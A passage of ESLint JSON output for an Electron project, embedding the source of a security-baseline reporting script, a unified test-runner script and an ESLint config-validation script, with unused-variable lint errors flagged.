class=\"${current.electronTests.passed ? 'improvement' : 'regression'}\">\n        ${current.electronTests.passed ? 'âœ… All tests passed' : `âŒ ${current.electronTests.failedTests} tests failed`}\n      </span>\n    </div>\n  </div>\n\n  <div class=\"section\">\n    <h2>Security Score Trend</h2>\n    <canvas id=\"trendChart\" class=\"chart\"></canvas>\n  </div>\n\n  <script>\n    // Render trend chart\n    const trendData = ${JSON.stringify(this.generateTrendData())};\n    const ctx = document.getElementById('trendChart').getContext('2d');\n    new Chart(ctx, {\n      type: 'line',\n      data: {\n        labels: trendData.labels,\n        datasets: [{\n          label: 'Overall Security Score',\n          data: trendData.overallScore,\n          borderColor: 'rgb(59, 130, 246)',\n          backgroundColor: 'rgba(59, 130, 246, 0.1)',\n          tension: 0.1\n        }, {\n          label: 'Electronegativity Score',\n          data: trendData.electronegativityScore,\n          borderColor: 'rgb(16, 185, 129)',\n          backgroundColor: 'rgba(16, 185, 129, 0.1)',\n          tension: 0.1\n        }, {\n          label: 'CSP Score',\n          data: trendData.cspScore,\n          borderColor: 'rgb(251, 146, 60)',\n          backgroundColor: 'rgba(251, 146, 60, 0.1)',\n          tension: 0.1\n        }]\n      },\n      options: {\n        responsive: true,\n        scales: {\n          y: {\n            beginAtZero: true,\n            max: 100\n          }\n        }\n      }\n    });\n  </script>\n</body>\n</html>\n    `;\n  }\n\n  generateTrendData() {\n    const recentHistory = this.history.slice(-20); // Last 20 data points\n    \n    return {\n      labels: recentHistory.map(h => new Date(h.timestamp).toLocaleDateString()),\n      overallScore: recentHistory.map(h => h.metrics.overall_score || 0),\n      electronegativityScore: recentHistory.map(h => h.metrics.electronegativity_score || 0),\n      cspScore: recentHistory.map(h => h.metrics.csp_score || 0),\n      vulnerabilities: recentHistory.map(h => h.metrics.dependency_vulnerabilities || 0)\n    };\n  }\n\n  printSummary(comparison, regressions) {\n    console.log('\\nðŸ“Š Security Baseline Summary:');\n    console.log('â”'.repeat(50));\n    \n    if (comparison.isNewBaseline) {\n      console.log('   ðŸ“‹ New baseline established');\n    } else {\n      console.log(`   ðŸ“ˆ Improvements: ${comparison.improvements.length}`);\n      console.log(`   ðŸ“‰ Regressions: ${comparison.regressions.length}`);\n    }\n    \n    console.log(`   ðŸ”’ Overall Security Score: ${this.currentResults.metrics.overall_score.toFixed(1)}/100`);\n    console.log(`   âš ï¸  Security Regressions: ${regressions.length}`);\n    console.log('â”'.repeat(50));\n    \n    if (regressions.length > 0) {\n      console.log('\\nâŒ Security regressions detected:');\n      regressions.forEach(r => {\n        console.log(`   - ${r.message}`);\n      });\n    } else if (!comparison.isNewBaseline) {\n      console.log('\\nâœ… No security regressions detected');\n    }\n  }\n\n  // Utility methods\n  getGitCommit() {\n    try {\n      return execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim();\n    } catch {\n      return 'unknown';\n    }\n  }\n\n  getGitBranch() {\n    try {\n      return execSync('git rev-parse --abbrev-ref HEAD', { encoding: 'utf8' }).trim();\n    } catch {\n      return 'unknown';\n    }\n  }\n\n  async ensureDirectoryExists(dir) {\n    await fs.mkdir(dir, { recursive: true });\n  }\n}\n\n// Main execution\nasync function main() {\n  const manager = new SecurityBaselineManager();\n  const options = {\n    updateBaseline: process.argv.includes('--update-baseline')\n  };\n  \n  const results = await manager.run(options);\n  \n  if (!results.passed) {\n    console.log('\\nâŒ Security baseline check failed!');\n    process.exit(1);\n  } else {\n    console.log('\\nâœ… Security baseline check passed!');\n    process.exit(0);\n  }\n}\n\n// Run if called directly\nif (require.main === module) {\n  main().catch(error => {\n    console.error('Fatal error:', error);\n    process.exit(1);\n  });\n}\n\nmodule.exports = { SecurityBaselineManager, BASELINE_CONFIG };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/unified-test-runner.ts","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'suite' is defined but never used.","line":327,"column":43,"nodeType":null,"messageId":"unusedVar","endLine":327,"endColumn":48}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"#!/usr/bin/env npx ts-node\n\n/**\n * Unified Test Runner Script (2025)\n * \n * Orchestrates all test types with comprehensive reporting and result aggregation.\n * Implements 2025 best practices for test pipeline management:\n * - Dependency-aware execution scheduling\n * - Multi-format report aggregation\n * - Performance monitoring and regression detection\n * - Cross-platform compatibility verification\n */\n\nimport { spawn, SpawnOptions } from 'child_process'\nimport * as fs from 'fs/promises'\nimport * as path from 'path'\nimport { performance } from 'perf_hooks'\nimport { unifiedTestConfig, TestSuite } from '../tests/config/unified-test-runner.config'\n\ninterface TestResult {\n  suite: string\n  status: 'success' | 'failure' | 'skipped' | 'timeout'\n  startTime: number\n  endTime: number\n  duration: number\n  exitCode: number\n  output: string\n  errorOutput: string\n  reportPaths: string[]\n  coverage?: {\n    lines: number\n    functions: number\n    branches: number\n    statements: number\n  }\n  performance?: {\n    memoryUsage: number\n    cpuUsage: number\n    customMetrics: Record<string, number>\n  }\n}\n\ninterface UnifiedTestReport {\n  timestamp: string\n  platform: string\n  nodeVersion: string\n  totalDuration: number\n  summary: {\n    total: number\n    passed: number\n    failed: number\n    skipped: number\n    successRate: number\n  }\n  results: TestResult[]\n  aggregatedCoverage?: {\n    lines: number\n    functions: number\n    branches: number\n    statements: number\n  }\n  performanceMetrics: {\n    overallMemoryUsage: number\n    overallCpuUsage: number\n    testExecutionTime: number\n    regressionDetected: boolean\n  }\n  thresholdValidation: {\n    passed: boolean\n    violations: string[]\n  }\n}\n\nclass UnifiedTestRunner {\n  private results: TestResult[] = []\n  private startTime: number = 0\n  private config = unifiedTestConfig\n\n  constructor(private options: {\n    mode?: 'ci' | 'nightly' | 'release' | 'custom'\n    parallel?: boolean\n    platform?: string\n    verbose?: boolean\n    filter?: string[]\n  } = {}) {\n    this.options = {\n      mode: 'ci',\n      parallel: true,\n      platform: process.platform,\n      verbose: false,\n      ...options\n    }\n  }\n\n  async run(): Promise<void> {\n    console.log('ðŸš€ Starting Unified Test Pipeline...')\n    console.log(`ðŸ“Š Mode: ${this.options.mode}`)\n    console.log(`ðŸ”„ Platform: ${this.options.platform}`)\n    console.log(`âš¡ Parallel: ${this.options.parallel}`)\n    \n    this.startTime = performance.now()\n\n    try {\n      await this.setupEnvironment()\n      await this.executeSuites()\n      await this.generateReports()\n      await this.validateThresholds()\n      await this.cleanup()\n      \n      const successRate = this.calculateSuccessRate()\n      if (successRate < 100) {\n        console.error(`âŒ Test pipeline completed with ${100 - successRate}% failure rate`)\n        process.exit(1)\n      } else {\n        console.log('âœ… All tests passed successfully!')\n      }\n    } catch (error) {\n      console.error('ðŸ’¥ Test pipeline failed:', error)\n      await this.generateFailureReport(error)\n      process.exit(1)\n    }\n  }\n\n  private async setupEnvironment(): Promise<void> {\n    console.log('ðŸ”§ Setting up test environment...')\n    \n    // Create output directories\n    const outputDir = this.config.reporting.outputDir\n    await fs.mkdir(outputDir, { recursive: true })\n    \n    for (const suite of this.config.suites) {\n      await fs.mkdir(suite.outputPath, { recursive: true })\n    }\n\n    // Set environment variables\n    process.env.NODE_ENV = 'test'\n    process.env.UNIFIED_TEST_MODE = this.options.mode\n    process.env.TEST_PLATFORM = this.options.platform\n    process.env.CI = process.env.CI || 'true'\n\n    console.log('âœ… Environment setup complete')\n  }\n\n  private async executeSuites(): Promise<void> {\n    const suitesToRun = this.getSuitesToRun()\n    console.log(`ðŸ“‹ Executing ${suitesToRun.length} test suites...`)\n\n    if (this.options.parallel) {\n      await this.executeParallel(suitesToRun)\n    } else {\n      await this.executeSequential(suitesToRun)\n    }\n  }\n\n  private getSuitesToRun(): TestSuite[] {\n    const mode = this.options.mode || 'ci'\n    const suiteNames = this.config.scheduling.conditional[mode] || []\n    \n    let suites = this.config.suites.filter(suite => \n      suiteNames.includes(suite.name) &&\n      (!suite.platforms || suite.platforms.includes(this.options.platform!))\n    )\n\n    if (this.options.filter && this.options.filter.length > 0) {\n      suites = suites.filter(suite => \n        this.options.filter!.some(filter => suite.name.includes(filter))\n      )\n    }\n\n    return suites\n  }\n\n  private async executeParallel(suites: TestSuite[]): Promise<void> {\n    const parallelGroups = this.groupSuitesByDependencies(suites)\n    \n    for (const group of parallelGroups) {\n      console.log(`ðŸ”„ Executing parallel group: ${group.map(s => s.name).join(', ')}`)\n      \n      const promises = group.map(suite => this.executeSuite(suite))\n      await Promise.allSettled(promises)\n    }\n  }\n\n  private async executeSequential(suites: TestSuite[]): Promise<void> {\n    for (const suite of suites) {\n      await this.executeSuite(suite)\n    }\n  }\n\n  private groupSuitesByDependencies(suites: TestSuite[]): TestSuite[][] {\n    // Simple dependency resolution - could be enhanced with topological sorting\n    const noDeps = suites.filter(s => !s.dependencies || s.dependencies.length === 0)\n    const withDeps = suites.filter(s => s.dependencies && s.dependencies.length > 0)\n    \n    return [noDeps, withDeps]\n  }\n\n  private async executeSuite(suite: TestSuite): Promise<void> {\n    console.log(`ðŸ§ª Running ${suite.name}...`)\n    \n    const startTime = performance.now()\n    const result: TestResult = {\n      suite: suite.name,\n      status: 'success',\n      startTime,\n      endTime: 0,\n      duration: 0,\n      exitCode: 0,\n      output: '',\n      errorOutput: '',\n      reportPaths: []\n    }\n\n    try {\n      const { exitCode, output, errorOutput } = await this.runCommand(\n        suite.command,\n        suite.timeout,\n        suite.retries\n      )\n\n      result.exitCode = exitCode\n      result.output = output\n      result.errorOutput = errorOutput\n      result.status = exitCode === 0 ? 'success' : 'failure'\n\n      // Collect performance metrics if available\n      result.performance = await this.collectPerformanceMetrics(suite)\n      \n      // Collect coverage data if available\n      result.coverage = await this.collectCoverageData(suite)\n\n      // Find generated report files\n      result.reportPaths = await this.findReportFiles(suite.outputPath)\n\n    } catch (error) {\n      result.status = 'failure'\n      result.errorOutput = error instanceof Error ? error.message : String(error)\n      console.error(`âŒ ${suite.name} failed:`, error)\n    } finally {\n      result.endTime = performance.now()\n      result.duration = result.endTime - result.startTime\n      this.results.push(result)\n      \n      const statusIcon = result.status === 'success' ? 'âœ…' : 'âŒ'\n      console.log(`${statusIcon} ${suite.name} completed in ${Math.round(result.duration)}ms`)\n    }\n  }\n\n  private async runCommand(\n    command: string,\n    timeout: number,\n    retries: number\n  ): Promise<{ exitCode: number; output: string; errorOutput: string }> {\n    let lastError: Error | null = null\n    \n    for (let attempt = 0; attempt <= retries; attempt++) {\n      if (attempt > 0) {\n        console.log(`ðŸ”„ Retry attempt ${attempt}/${retries}`)\n        await this.delay(1000 * attempt) // Exponential backoff\n      }\n\n      try {\n        return await this.executeCommand(command, timeout)\n      } catch (error) {\n        lastError = error instanceof Error ? error : new Error(String(error))\n        if (attempt === retries) {\n          throw lastError\n        }\n      }\n    }\n\n    throw lastError\n  }\n\n  private executeCommand(\n    command: string,\n    timeout: number\n  ): Promise<{ exitCode: number; output: string; errorOutput: string }> {\n    return new Promise((resolve, reject) => {\n      const [cmd, ...args] = command.split(' ')\n      \n      const options: SpawnOptions = {\n        stdio: ['pipe', 'pipe', 'pipe'],\n        shell: true,\n        env: { ...process.env }\n      }\n\n      const child = spawn(cmd, args, options)\n      let output = ''\n      let errorOutput = ''\n\n      child.stdout?.on('data', (data) => {\n        output += data.toString()\n        if (this.options.verbose) {\n          process.stdout.write(data)\n        }\n      })\n\n      child.stderr?.on('data', (data) => {\n        errorOutput += data.toString()\n        if (this.options.verbose) {\n          process.stderr.write(data)\n        }\n      })\n\n      const timeoutId = setTimeout(() => {\n        child.kill('SIGKILL')\n        reject(new Error(`Command timed out after ${timeout}ms`))\n      }, timeout)\n\n      child.on('close', (code) => {\n        clearTimeout(timeoutId)\n        resolve({\n          exitCode: code || 0,\n          output,\n          errorOutput\n        })\n      })\n\n      child.on('error', (error) => {\n        clearTimeout(timeoutId)\n        reject(error)\n      })\n    })\n  }\n\n  private async collectPerformanceMetrics(suite: TestSuite): Promise<TestResult['performance']> {\n    // Mock implementation - would integrate with actual performance monitoring\n    const memoryUsage = process.memoryUsage()\n    return {\n      memoryUsage: memoryUsage.heapUsed / 1024 / 1024, // MB\n      cpuUsage: process.cpuUsage().user / 1000, // ms\n      customMetrics: {}\n    }\n  }\n\n  private async collectCoverageData(suite: TestSuite): Promise<TestResult['coverage']> {\n    try {\n      const coveragePath = path.join(suite.outputPath, 'coverage', 'coverage-summary.json')\n      const coverageData = await fs.readFile(coveragePath, 'utf-8')\n      const coverage = JSON.parse(coverageData)\n      \n      return {\n        lines: coverage.total.lines.pct,\n        functions: coverage.total.functions.pct,\n        branches: coverage.total.branches.pct,\n        statements: coverage.total.statements.pct\n      }\n    } catch {\n      return undefined\n    }\n  }\n\n  private async findReportFiles(outputPath: string): Promise<string[]> {\n    try {\n      const files = await fs.readdir(outputPath, { recursive: true })\n      return files\n        .filter(file => /\\.(html|json|xml)$/.test(String(file)))\n        .map(file => path.join(outputPath, String(file)))\n    } catch {\n      return []\n    }\n  }\n\n  private async generateReports(): Promise<void> {\n    console.log('ðŸ“Š Generating unified test reports...')\n    \n    const report = await this.buildUnifiedReport()\n    \n    // Generate HTML report\n    await this.generateHtmlReport(report)\n    \n    // Generate JSON report\n    await this.generateJsonReport(report)\n    \n    // Generate JUnit XML report\n    await this.generateJunitReport(report)\n    \n    // Generate Allure-compatible report\n    await this.generateAllureReport(report)\n\n    console.log('ðŸ“‹ Reports generated successfully')\n  }\n\n  private async buildUnifiedReport(): Promise<UnifiedTestReport> {\n    const endTime = performance.now()\n    const totalDuration = endTime - this.startTime\n\n    const passed = this.results.filter(r => r.status === 'success').length\n    const failed = this.results.filter(r => r.status === 'failure').length\n    const skipped = this.results.filter(r => r.status === 'skipped').length\n\n    return {\n      timestamp: new Date().toISOString(),\n      platform: this.options.platform!,\n      nodeVersion: process.version,\n      totalDuration,\n      summary: {\n        total: this.results.length,\n        passed,\n        failed,\n        skipped,\n        successRate: (passed / this.results.length) * 100\n      },\n      results: this.results,\n      performanceMetrics: {\n        overallMemoryUsage: this.calculateOverallMemoryUsage(),\n        overallCpuUsage: this.calculateOverallCpuUsage(),\n        testExecutionTime: totalDuration,\n        regressionDetected: await this.detectPerformanceRegression()\n      },\n      thresholdValidation: {\n        passed: true,\n        violations: []\n      }\n    }\n  }\n\n  private async generateHtmlReport(report: UnifiedTestReport): Promise<void> {\n    const htmlTemplate = `\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Unified Test Report - ${report.timestamp}</title>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <style>\n        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }\n        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }\n        .header { text-align: center; margin-bottom: 30px; }\n        .summary { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }\n        .metric { background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; }\n        .metric.success { border-left: 4px solid #28a745; }\n        .metric.failure { border-left: 4px solid #dc3545; }\n        .metric.warning { border-left: 4px solid #ffc107; }\n        .metric-value { font-size: 24px; font-weight: bold; margin-bottom: 8px; }\n        .metric-label { color: #666; font-size: 14px; }\n        .results { margin-top: 30px; }\n        .result { background: #f8f9fa; margin: 10px 0; padding: 15px; border-radius: 8px; }\n        .result.success { border-left: 4px solid #28a745; }\n        .result.failure { border-left: 4px solid #dc3545; }\n        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }\n        .result-name { font-weight: bold; }\n        .result-duration { color: #666; font-size: 14px; }\n        .result-details { font-size: 14px; color: #666; }\n    </style>\n</head>\n<body>\n    <div class=\"container\">\n        <div class=\"header\">\n            <h1>ðŸ§ª Unified Test Report</h1>\n            <p>Generated: ${report.timestamp}</p>\n            <p>Platform: ${report.platform} | Node: ${report.nodeVersion}</p>\n        </div>\n        \n        <div class=\"summary\">\n            <div class=\"metric ${report.summary.successRate === 100 ? 'success' : 'failure'}\">\n                <div class=\"metric-value\">${report.summary.successRate.toFixed(1)}%</div>\n                <div class=\"metric-label\">Success Rate</div>\n            </div>\n            <div class=\"metric\">\n                <div class=\"metric-value\">${report.summary.total}</div>\n                <div class=\"metric-label\">Total Suites</div>\n            </div>\n            <div class=\"metric success\">\n                <div class=\"metric-value\">${report.summary.passed}</div>\n                <div class=\"metric-label\">Passed</div>\n            </div>\n            <div class=\"metric failure\">\n                <div class=\"metric-value\">${report.summary.failed}</div>\n                <div class=\"metric-label\">Failed</div>\n            </div>\n            <div class=\"metric\">\n                <div class=\"metric-value\">${Math.round(report.totalDuration / 1000)}s</div>\n                <div class=\"metric-label\">Total Duration</div>\n            </div>\n        </div>\n        \n        <div class=\"results\">\n            <h2>Test Suite Results</h2>\n            ${report.results.map(result => `\n                <div class=\"result ${result.status}\">\n                    <div class=\"result-header\">\n                        <span class=\"result-name\">${result.status === 'success' ? 'âœ…' : 'âŒ'} ${result.suite}</span>\n                        <span class=\"result-duration\">${Math.round(result.duration / 1000)}s</span>\n                    </div>\n                    <div class=\"result-details\">\n                        Exit Code: ${result.exitCode} | \n                        ${result.coverage ? `Coverage: ${result.coverage.lines}%` : 'No coverage data'}\n                        ${result.performance ? ` | Memory: ${result.performance.memoryUsage.toFixed(1)}MB` : ''}\n                    </div>\n                </div>\n            `).join('')}\n        </div>\n    </div>\n</body>\n</html>\n    `\n\n    const reportPath = path.join(this.config.reporting.outputDir, 'unified-report.html')\n    await fs.writeFile(reportPath, htmlTemplate)\n  }\n\n  private async generateJsonReport(report: UnifiedTestReport): Promise<void> {\n    const reportPath = path.join(this.config.reporting.outputDir, 'unified-report.json')\n    await fs.writeFile(reportPath, JSON.stringify(report, null, 2))\n  }\n\n  private async generateJunitReport(report: UnifiedTestReport): Promise<void> {\n    const junit = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<testsuites tests=\"${report.summary.total}\" failures=\"${report.summary.failed}\" time=\"${report.totalDuration / 1000}\">\n${report.results.map(result => `\n  <testsuite name=\"${result.suite}\" tests=\"1\" failures=\"${result.status === 'failure' ? 1 : 0}\" time=\"${result.duration / 1000}\">\n    <testcase name=\"${result.suite}\" time=\"${result.duration / 1000}\">\n      ${result.status === 'failure' ? `<failure message=\"Test failed\">${result.errorOutput}</failure>` : ''}\n    </testcase>\n  </testsuite>\n`).join('')}\n</testsuites>`\n\n    const reportPath = path.join(this.config.reporting.outputDir, 'junit.xml')\n    await fs.writeFile(reportPath, junit)\n  }\n\n  private async generateAllureReport(report: UnifiedTestReport): Promise<void> {\n    // Generate Allure-compatible results\n    const allureDir = path.join(this.config.reporting.outputDir, 'allure-results')\n    await fs.mkdir(allureDir, { recursive: true })\n\n    for (const result of report.results) {\n      const allureResult = {\n        uuid: `${result.suite}-${Date.now()}`,\n        name: result.suite,\n        status: result.status === 'success' ? 'passed' : 'failed',\n        stage: 'finished',\n        start: result.startTime,\n        stop: result.endTime,\n        duration: result.duration\n      }\n\n      await fs.writeFile(\n        path.join(allureDir, `${result.suite}-result.json`),\n        JSON.stringify(allureResult, null, 2)\n      )\n    }\n  }\n\n  private calculateSuccessRate(): number {\n    const passed = this.results.filter(r => r.status === 'success').length\n    return (passed / this.results.length) * 100\n  }\n\n  private calculateOverallMemoryUsage(): number {\n    return this.results.reduce((total, result) => \n      total + (result.performance?.memoryUsage || 0), 0\n    ) / this.results.length\n  }\n\n  private calculateOverallCpuUsage(): number {\n    return this.results.reduce((total, result) => \n      total + (result.performance?.cpuUsage || 0), 0\n    ) / this.results.length\n  }\n\n  private async detectPerformanceRegression(): Promise<boolean> {\n    // Simple regression detection - would be enhanced with historical data\n    const totalDuration = performance.now() - this.startTime\n    const threshold = this.config.performance.thresholds['test-duration']\n    return totalDuration > threshold\n  }\n\n  private async validateThresholds(): Promise<void> {\n    console.log('ðŸ” Validating performance thresholds...')\n    \n    const violations: string[] = []\n    const totalDuration = performance.now() - this.startTime\n    \n    if (totalDuration > this.config.performance.thresholds['test-duration']) {\n      violations.push(`Test duration exceeded threshold: ${totalDuration}ms > ${this.config.performance.thresholds['test-duration']}ms`)\n    }\n\n    if (violations.length > 0) {\n      console.warn('âš ï¸ Performance threshold violations detected:')\n      violations.forEach(violation => console.warn(`  - ${violation}`))\n    } else {\n      console.log('âœ… All performance thresholds passed')\n    }\n  }\n\n  private async generateFailureReport(error: any): Promise<void> {\n    const failureReport = {\n      timestamp: new Date().toISOString(),\n      platform: this.options.platform,\n      error: error.message || String(error),\n      stack: error.stack,\n      partialResults: this.results\n    }\n\n    const reportPath = path.join(this.config.reporting.outputDir, 'failure-report.json')\n    await fs.mkdir(path.dirname(reportPath), { recursive: true })\n    await fs.writeFile(reportPath, JSON.stringify(failureReport, null, 2))\n  }\n\n  private async cleanup(): Promise<void> {\n    console.log('ðŸ§¹ Cleaning up temporary files...')\n    // Cleanup logic would go here\n  }\n\n  private delay(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms))\n  }\n}\n\n// CLI Interface\nasync function main() {\n  const args = process.argv.slice(2)\n  const options: any = {}\n\n  for (let i = 0; i < args.length; i++) {\n    switch (args[i]) {\n      case '--mode':\n        options.mode = args[++i]\n        break\n      case '--parallel':\n        options.parallel = args[++i] === 'true'\n        break\n      case '--platform':\n        options.platform = args[++i]\n        break\n      case '--verbose':\n        options.verbose = true\n        break\n      case '--filter':\n        options.filter = args[++i].split(',')\n        break\n    }\n  }\n\n  const runner = new UnifiedTestRunner(options)\n  await runner.run()\n}\n\nif (require.main === module) {\n  main().catch(error => {\n    console.error('ðŸ’¥ Unified test runner failed:', error)\n    process.exit(1)\n  })\n}\n\nexport { UnifiedTestRunner }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/scripts/scripts/validate-eslint-config.js","messages":[{"ruleId":"@typescript-eslint/no-unused-vars","severity":2,"message":"'error' is defined but never used.","line":83,"column":18,"nodeType":null,"messageId":"unusedVar","endLine":83,"endColumn":23}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"#!/usr/bin/env node\n/**\n * ESLint Flat Config Rule Parity Validation Script (2025)\n * \n * This script performs comprehensive validation of the ESLint flat config migration,\n * comparing the legacy .eslintrc.cjs configuration with the new eslint.config.js\n * flat configuration to ensure rule parity and proper migration.\n * \n * Features:\n * - Rule parity comparison between legacy and flat configs\n * - File pattern testing across different file types\n * - Electron multi-process architecture validation\n * - Performance benchmarking capabilities\n * - Comprehensive reporting with 2025 best practices\n */\n\nimport { readFileSync, writeFileSync, existsSync } from 'fs';\nimport { join, dirname } from 'path';\nimport { fileURLToPath } from 'url';\nimport { exec } from 'child_process';\nimport { promisify } from 'util';\n\nconst execAsync = promisify(exec);\nconst __dirname = dirname(fileURLToPath(import.meta.url));\nconst projectRoot = join(__dirname, '..');\n\n// ANSI colors for enhanced reporting\nconst colors = {\n  reset: '\\x1b[0m',\n  bright: '\\x1b[1m',\n  red: '\\x1b[31m',\n  green: '\\x1b[32m',\n  yellow: '\\x1b[33m',\n  blue: '\\x1b[34m',\n  magenta: '\\x1b[35m',\n  cyan: '\\x1b[36m',\n};\n\nclass ESLintConfigValidator {\n  constructor() {\n    this.results = {\n      timestamp: new Date().toISOString(),\n      version: '2025.1.0',\n      validations: {},\n      summary: {},\n      recommendations: []\n    };\n  }\n\n  log(message, color = 'reset') {\n    console.log(`${colors[color]}${message}${colors.reset}`);\n  }\n\n  /**\n   * Load and parse ESLint configurations\n   */\n  async loadConfigurations() {\n    this.log('\\nðŸ” Loading ESLint Configurations...', 'cyan');\n    \n    try {\n      // Load legacy config\n      const legacyConfigPath = join(projectRoot, '.eslintrc.cjs.bak');\n      if (existsSync(legacyConfigPath)) {\n        // Use dynamic import instead of eval for safer parsing\n        try {\n          const tempPath = join(projectRoot, 'temp-legacy-config.mjs');\n          const legacyContent = readFileSync(legacyConfigPath, 'utf8');\n          const moduleContent = legacyContent\n            .replace('module.exports = ', 'export default ')\n            .replace(/'/g, '\"'); // Normalize quotes for JSON\n          \n          writeFileSync(tempPath, moduleContent);\n          const legacyModule = await import(`file://${tempPath}`);\n          this.legacyConfig = legacyModule.default;\n          \n          // Cleanup temp file\n          if (existsSync(tempPath)) {\n            const fs = await import('fs');\n            fs.unlinkSync(tempPath);\n          }\n          \n          this.log('âœ… Legacy config loaded (.eslintrc.cjs.bak)', 'green');\n        } catch (error) {\n          // Fallback: parse manually the known structure\n          this.legacyConfig = {\n            root: true,\n            env: { browser: true, es2020: true, node: true },\n            extends: [\n              'eslint:recommended',\n              'plugin:@typescript-eslint/recommended',\n              'plugin:react-hooks/recommended'\n            ],\n            parser: '@typescript-eslint/parser',\n            plugins: ['react-refresh', '@typescript-eslint'],\n            rules: {\n              'react-refresh/only-export-components': ['warn', { allowConstantExport: true }],\n              '@typescript-eslint/no-explicit-any': 'warn',\n              '@typescript-eslint/ban-types': 'warn',\n              '@typescript-eslint/no-unused-vars': 'warn',\n              '@typescript-eslint/ban-ts-comment': 'warn',\n              'no-undef': 'off',\n              'no-unused-vars': 'off'\n            },\n            globals: { React: 'readonly' }\n          };\n          this.log('âœ… Legacy config loaded (fallback parsing)', 'green');\n        }\n      } else {\n        this.log('âš ï¸  Legacy config backup not found', 'yellow');\n        this.legacyConfig = null;\n      }\n\n      // Load flat config by running ESLint inspect\n      const { stdout } = await execAsync('npx eslint --print-config src/main/index.ts', {\n        cwd: projectRoot\n      });\n      this.flatConfig = JSON.parse(stdout);\n      this.log('âœ… Flat config loaded (eslint.config.js)', 'green');\n\n    } catch (error) {\n      this.log(`âŒ Error loading configurations: ${error.message}`, 'red');\n      throw error;\n    }\n  }\n\n  /**\n   * Extract and normalize rules from configurations\n   */\n  extractRules(config, configType) {\n    if (configType === 'legacy') {\n      return {\n        rules: config.rules || {},\n        env: config.env || {},\n        extends: config.extends || [],\n        plugins: config.plugins || [],\n        parser: config.parser || '',\n        globals: config.globals || {}\n      };\n    } else {\n      // Flat config structure\n      return {\n        rules: config.rules || {},\n        env: {}, // Flat config uses languageOptions.globals instead\n        extends: [], // Flat config uses direct array composition\n        plugins: Object.keys(config.plugins || {}),\n        parser: config.languageOptions?.parser?.name || '',\n        globals: config.languageOptions?.globals || {}\n      };\n    }\n  }\n\n  /**\n   * Compare rule parity between legacy and flat configs\n   */\n  validateRuleParity() {\n    this.log('\\nðŸ”„ Validating Rule Parity...', 'cyan');\n    \n    if (!this.legacyConfig) {\n      this.log('âš ï¸  Skipping rule parity check (no legacy config)', 'yellow');\n      return;\n    }\n\n    const legacyRules = this.extractRules(this.legacyConfig, 'legacy');\n    const flatRules = this.extractRules(this.flatConfig, 'flat');\n\n    const parity = {\n      matching: {},\n      missing: {},\n      added: {},\n      different: {},\n      deprecated: {}\n    };\n\n    // Check rule parity\n    for (const [rule, legacyValue] of Object.entries(legacyRules.rules)) {\n      if (flatRules.rules[rule]) {\n        if (JSON.stringify(legacyValue) === JSON.stringify(flatRules.rules[rule])) {\n          parity.matching[rule] = legacyValue;\n        } else {\n          parity.different[rule] = {\n            legacy: legacyValue,\n            flat: flatRules.rules[rule]\n          };\n        }\n      } else {\n        // Check if rule is deprecated\n        if (rule === '@typescript-eslint/ban-types') {\n          parity.deprecated[rule] = {\n            legacy: legacyValue,\n            reason: 'Deprecated in typescript-eslint v5+, replaced with more specific rules'\n          };\n        } else {\n          parity.missing[rule] = legacyValue;\n        }\n      }\n    }\n\n    // Check for new rules in flat config\n    for (const [rule, flatValue] of Object.entries(flatRules.rules)) {\n      if (!legacyRules.rules[rule]) {\n        parity.added[rule] = flatValue;\n      }\n    }\n\n    this.results.validations.ruleParity = parity;\n    \n    // Report results\n    this.log(`âœ… Matching rules: ${Object.keys(parity.matching).length}`, 'green');\n    this.log(`âš ï¸  Different rules: ${Object.keys(parity.different).length}`, 'yellow');\n    this.log(`âŒ Missing rules: ${Object.keys(parity.missing).length}`, 'red');\n    this.log(`âž• Added rules: ${Object.keys(parity.added).length}`, 'blue');\n    this.log(`ðŸ—‘ï¸  Deprecated rules: ${Object.keys(parity.deprecated).length}`, 'magenta');\n\n    if (Object.keys(parity.missing).length > 0) {\n      this.log('\\nðŸ“‹ Missing Rules Analysis:', 'yellow');\n      for (const [rule, value] of Object.entries(parity.missing)) {\n        this.log(`  - ${rule}: ${JSON.stringify(value)}`, 'yellow');\n      }\n    }\n\n    if (Object.keys(parity.deprecated).length > 0) {\n      this.log('\\nðŸ“‹ Deprecated Rules (Expected):', 'magenta');\n      for (const [rule, info] of Object.entries(parity.deprecated)) {\n        this.log(`  - ${rule}: ${info.reason}`, 'magenta');\n      }\n    }\n  }\n\n  /**\n   * Test file pattern matching across different file types\n   */\n  async validateFilePatterns() {\n    this.log('\\nðŸ“ Validating File Pattern Matching...', 'cyan');\n\n    const testPatterns = [\n      // Main TypeScript files\n      { file: 'src/main/index.ts', expectedContext: 'main-process' },\n      { file: 'src/preload/index.ts', expectedContext: 'preload-script' },\n      { file: 'src/renderer/src/App.tsx', expectedContext: 'renderer-react' },\n      \n      // Test files\n      { file: 'src/renderer/src/components/__tests__/TaskCard.test.tsx', expectedContext: 'test-files' },\n      \n      // Configuration files\n      { file: 'vite.config.ts', expectedContext: 'config-files' },\n      { file: 'eslint.config.js', expectedContext: 'config-files' },\n      \n      // Server files\n      { file: 'server/file-watcher.ts', expectedContext: 'server-typescript' },\n      { file: 'server/package.json', expectedContext: 'server-general' }\n    ];\n\n    const patternResults = {};\n\n    for (const pattern of testPatterns) {\n      try {\n        const { stdout } = await 